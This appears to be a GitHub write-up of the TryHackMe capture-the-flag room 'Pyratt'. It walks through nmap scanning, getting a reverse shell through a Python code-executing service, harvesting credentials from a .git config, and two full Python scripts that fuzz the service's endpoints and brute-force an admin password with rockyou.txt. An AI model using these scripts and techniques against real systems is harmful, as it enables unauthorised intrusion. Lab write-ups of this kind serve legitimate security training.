# tryhackme-Pyratt-Writeup
![intro](https://github.com/user-attachments/assets/28e04153-3286-4a8a-8d50-29f529071f88)
# tryhackme-Pyratt-Writeup

This is a walkthrough for the tryhackme CTF Pyratt. I will not provide any flags or passwords as this is intended to be used as a guide. Think you're up for the Challange?

## Scanning/Reconnaissance

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -sV -sC -A -v $ip -oN
```

Command break down:

-sV

Service Version Detection: This option enables version detection, which attempts to determine the version of the software running on open ports. For example, it might identify an HTTP server as Apache with a specific version.
-sC

Default Scripts: This option runs a collection of default NSE (Nmap Scripting Engine) scripts that are commonly useful. These scripts perform various functions like checking for vulnerabilities, gathering additional information, and identifying open services. They’re a good starting point for gathering basic information about a host.
-A

Aggressive Scan: This option enables several scans at once. It combines OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute (--traceroute). It’s useful for a comprehensive scan but can be intrusive and time-consuming.
-v

Verbose Mode: Enables verbose output, which provides more detailed information about the scan’s progress and results.
$ip

Target IP: This is a placeholder for the target IP address you want to scan. In practice, replace $ip with the actual IP of the machine you are targeting.
-oN

Output in Normal Format: This option saves the scan results in a plain text file format. After -oN, specify a filename where you want to store the output.

The scan reveals a simple http web server on port 8000, and ssh.

![nmap](https://github.com/user-attachments/assets/96e6f487-b646-49d4-97a9-f7a41358ce6f)

When visiting the webserver on $ip:8000, there is just a message to "try a more basic connection". 
Let's try to connect via netcat:
```bash
nc $ip 8000
```
After typing in a few cmds and thinking back to nmap showing that this is a python server, we can see that it accepts python cmds ex. print(33+55). 
Let's try inputting a python rev shell from revshells.com. Notice, since it is taking python cmds directly, do not inlude the python -c part of the shell. 

![www-data](https://github.com/user-attachments/assets/20065d7b-f457-4f62-a0c2-d9b4875bae10)

We now have a reverse shell as www-data. We are in the root directory so we don't have permission to ls in this directory. 
Running cat /etc/passwd reveals a user named think. I tried to navigate to home/think but we don't have permission. I then ran the find command to see what files and directories they have, which reveals /opt/dev/.git:

![think](https://github.com/user-attachments/assets/eb724ecd-2c11-406b-8570-102953979d5f)

Navigating to this directory we see a lot of files and dirs and www-data has read access to. The config file reveals credentials for think. Let's try to use these to ssh onto the target.

![ssh_think](https://github.com/user-attachments/assets/8b7b90ba-6939-4856-8c09-42550351c936)

Tbey worked, and we can now reveal the user flag from think's home dir.

I poked around the home dir but didn't seem to turn anything up. The hint says to "keep playing with the custom app" so I head back to /opt/dev/.git.

![logs](https://github.com/user-attachments/assets/7ac807a5-b250-488a-8c7a-1a1c77cc2fe3)

We can see some notes like 'added shell endpoint', and in logs there is a sha1 hash for a commit.

If we head back to /opt/dev and run the cmd git show (sha1 hash), it reveals the commit:

![git show](https://github.com/user-attachments/assets/c907c29f-2aa3-4a88-a68f-905a9dd49972)

This reveals the functionality of the python web server on port 8000. We see that it is asking for some specific data == 'some endpoint'. Then checks to see if you provide admin credentials, and if not, then the shell is www-data.

So I used this pythong script to run again the netcat connection to fuzz endpoints using the /dirb/common.txt wordlists. Here is the script:

```bash
import socket
import os

host = os.environ.get('ip')
if not host:
    print("Error: Environment variable 'ip' is not set")
    exit(1)

port = 8000

wordlist = "/usr/share/wordlists/dirb/common.txt"

def fuzz_endpoint(wordlist):
    unique_responses = set()  # Use a set to store unique responses
    try:
        with open(wordlist, 'r') as file:
            for line in file:
                command = line.strip()
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    s.sendall(command.encode() + b'\n')
                    response = s.recv(1024).decode().strip()
                    if response and "is not defined" not in response and "leading zeros" not in response:
                        # Only add and print unique responses
                        if response not in unique_responses:
                            unique_responses.add(response)
                            print(f"Command: {command}")
                            print(f"Unique Response: {response}\n")
    except FileNotFoundError:
        print(f"File doesn't exist")
    except Exception as e:
        print(f"Error has occurred: {e}")

fuzz_endpoint(wordlist)
```
The script reveals that the endpoint is admin:

![endpoint](https://github.com/user-attachments/assets/7b852d3a-9fb5-4244-bfbf-2758ca275a47)

When we enter the admin endpoint the script prompts us for a password. Now I ran another script to fuzz the admin endpoint password prompt with rockyou.txt:

```bash
import socket
import os

host = os.environ.get('ip')
if not host:
    print("Error: Environment variable 'ip' is not set")
    exit(1)

port = 8000

wordlist = "/usr/share/wordlists/rockyou.txt"

def fuzz_password(wordlist):
    try:
        with open(wordlist, 'r', errors='ignore') as file:
            for password in file:
                # Clean up lines
                password = password.strip()
                # Establish connection to server
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    # Send "admin" cmd to prompt for password
                    s.sendall(b'admin\n')
                    # Receive the password prompt
                    response = s.recv(1024).decode().strip()
                    if "password" in response.lower():
                        s.sendall((password + '\n').encode())
                        # Receive the response after entering the password
                        response = s.recv(1024).decode().strip()

                        # Check if the password is correct
                        if "password:" not in response.lower():
                            print(f'The password is: {password}')
                            return  # Exit the function if password is found
                    else:
                        print("Unexpected response from server")
                        return

        print("Password not found in wordlist")
    except FileNotFoundError:
        print(f"Wordlist file not found: {wordlist}")
    except Exception as e:
        print(f"Error has occurred: {e}")

fuzz_password(wordlist)
```
This script finishes pretty quickly to reveal a simple password. Now we can use the admin endpoint and password to gain a root shell and get the root flag! 

![root](https://github.com/user-attachments/assets/5ef050ec-6573-487a-aa9a-acd0c02fec82)
